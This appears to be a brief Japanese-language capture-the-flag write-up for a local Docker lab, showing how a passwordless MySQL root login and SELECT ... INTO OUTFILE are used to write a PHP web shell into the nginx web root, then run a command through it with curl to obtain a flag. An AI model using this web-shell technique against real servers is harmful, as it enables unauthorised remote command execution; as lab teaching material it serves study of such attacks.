# MySQL RCE

## 環境構築

```
$ docker build -t mysql-web .
$ docker run -d -p 127.0.0.1:3306:3306 -p 127.0.0.1:80:80 mysql-web:latest
```

## Exploit

index.phpでphpinfo()を表示しているので`/usr/share/nginx/html`にphpファイルを置けばいいと分かる。

```
$ mysql -u root -h 127.0.0.1
mysql> select '<?php system($_GET["cmd"]);?>' into OUTFILE '/usr/share/nginx/html/shell.php';
Query OK, 1 row affected (0.00 sec)
```

http://localhost/shell.php?cmd=run_it.sh にアクセス!!

```
$ curl http://localhost/shell.php?cmd=run_it.sh
flag{w3bsh3ll_1s_us3ful}
```